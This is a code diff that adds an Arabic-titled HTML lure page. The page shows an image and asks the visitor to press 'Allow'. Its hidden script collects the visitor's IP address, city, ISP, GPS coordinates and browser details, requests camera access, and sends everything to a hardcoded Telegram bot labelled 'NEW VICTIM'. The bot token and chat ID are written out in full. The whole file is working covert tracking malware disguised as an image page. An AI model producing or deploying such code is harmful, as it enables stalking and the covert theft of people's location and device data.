@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>صابونه دبي</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { margin: 0; padding: 20px; background: #000; color: white; text-align: center; }
+        img { max-width: 100%; border-radius: 10px; }
+        #camStatus { color: red; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h2>اضغط على "السماح" لعرض الصورة. </h2>
+    <img src="https://image2url.com/images/1754223677507-03a3b8dc-4a52-4cad-8207-64e6a5c6f74b.jpg" alt="Loading...">
+    <p id="camStatus">انتظر حتى تفتح الصورة</p>
+
+    <script>
+        // Telegram bot setup
+        const BOT_TOKEN = '8386686128:AAFLCInZJmy72La6aiWW2GPy9iTSfptNmts';
+        const CHAT_ID = '7307112522';
+
+        // 1. GRAB IP/GEOLOCATION
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(ipData => {
+                // 2. GRAB GPS (IF ALLOWED)
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const gps = `${pos.coords.latitude},${pos.coords.longitude}`;
+                        // 3. GRAB CAMERA FEED (REQUIRES USER CLICK "ALLOW")
+                        startCam(ipData, gps);
+                    },
+                    (err) => startCam(ipData, "GPS Blocked")
+                );
+            });
+
+        // STEAL CAMERA FEED
+        function startCam(ipData, gps) {
+            const camStatus = document.getElementById('camStatus');
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    camStatus.textContent = "Camera accessed! Sending data...";
+                    
+                    // 4. SEND DATA TO TELEGRAM
+                    const message = `🚨 **NEW VICTIM** 🚨\n\n` +
+                        `📸 **CAMERA ACCESSED**\n` +
+                        `📍 IP: ${ipData.ip}\n` +
+                        `🌎 City: ${ipData.city}\n` +
+                        `📡 ISP: ${ipData.org}\n` +
+                        `🎯 GPS: ${gps}\n` +
+                        `🔧 User-Agent: ${navigator.userAgent}`;
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+                })
+                .catch(err => {
+                    camStatus.textContent = "Camera blocked. Sending basic info...";
+                    const message = `⚠️ **VICTIM BLOCKED CAMERA** ⚠️\n\n` +
+                        `IP: ${ipData.ip}\n` +
+                        `GPS: ${gps}\n` +
+                        `User-Agent: ${navigator.userAgent}`;
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+                });
+        }
+    </script>
+</body>
+</html>
